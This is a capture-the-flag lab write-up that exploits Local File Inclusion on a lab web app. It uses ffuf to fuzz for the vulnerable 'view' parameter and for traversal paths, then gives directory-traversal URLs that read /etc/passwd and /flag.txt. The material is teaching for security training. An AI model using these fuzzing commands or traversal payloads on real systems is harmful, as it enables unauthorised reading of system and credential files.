# Automated Scanning File Inclusion Write Up

**Goal**: Use Local File Inclusion (LFI) to read the contents of `/flag.txt`

## Steps
### Step 1: Parameter Fuzzing

**Purpose**: To discover which parameter is vulnerable to LFI. LFI vulnerabilities occur when a web application uses user-supplied input to construct a file path. The attacker can then manipulate this input to include files they shouldn't have access to.

```bash
ffuf -w burp-parameter-names.txt -u http://83.136.252.66:33462/index.php?FUZZ=value -fs 2309
```
`-w burp-parameter-names.txt`: Specifies the wordlist to use. This file contains a list of common parameter names (e.g., page, include, file, view).

`-u http://83.136.252.66:33462/index.php?FUZZ=value`: The target URL. FUZZ is a placeholder that ffuf will replace with each word from the wordlist. The value is just a dummy value.

`-fs 2309`: Filters results based on file size. This means ffuf will exclude any responses with a file size of 2309 bytes. The goal is to identify responses with different sizes, which might indicate a successful inclusion or a different behavior when a specific parameter is used.

![image](https://github.com/user-attachments/assets/bb3e2df8-15a8-4b37-88e2-83cfbcfaefad)


**Result**: view was identified as a potentially vulnerable parameter.

### Step 2: Path Fuzzing
**Purpose**: To find the correct path to a known file, using directory traversal.
```bash
ffuf -w LFI-Jhaddix.txt:FUZZ -u http://83.136.252.66:33462/index.php?view=FUZZ -fs 1935
```
`-w LFI-Jhaddix.txt:FUZZ`: Uses the LFI-Jhaddix.txt wordlist. This wordlist contains various paths and payloads designed to exploit LFI vulnerabilities (e.g., ../../../../etc/passwd).

`-u http://83.136.252.66:33462/index.php?view=FUZZ`: Uses the view parameter (identified in the previous step) and replaces FUZZ with entries from the `LFI-Jhaddix.txt` wordlist.

`-fs 1935`: Filters out results with a size of 1935. This helps to narrow down potentially successful LFI attempts by looking for responses that differ in size.

**Result**: Several paths to `/etc/passwd` were found. This confirms the LFI vulnerability and indicates how many directory traversal levels are needed to reach the root directory.

![image](https://github.com/user-attachments/assets/93a2551d-48ec-4ca7-ae78-88756480926e)


### Step 3: Manual Verification and Reading /etc/passwd
**Purpose**: To manually confirm the LFI and understand how the file path is constructed
```url
http://83.136.252.66:44551/index.php?view=../../../../../../../../../../../../../../../../../../../../../../etc/passwd
```
You use the path identified by ffuf to read `/etc/passwd`. This step validates the LFI and provides information about the system.

### Step 4: Reading /flag.txt
**Purpose**: To exploit the LFI to read the target file.
```url
http://83.136.252.66:44551/index.php?view=../../../../../../../../../../../../../../../../../../../../../../flag.txt
```

### Conclusion
You used ffuf to automate the process of finding both the vulnerable parameter and the correct path to exploit the LFI and then manually verified the vulnerability. By adjusting the path, you were able to read the contents of `/flag.txt`
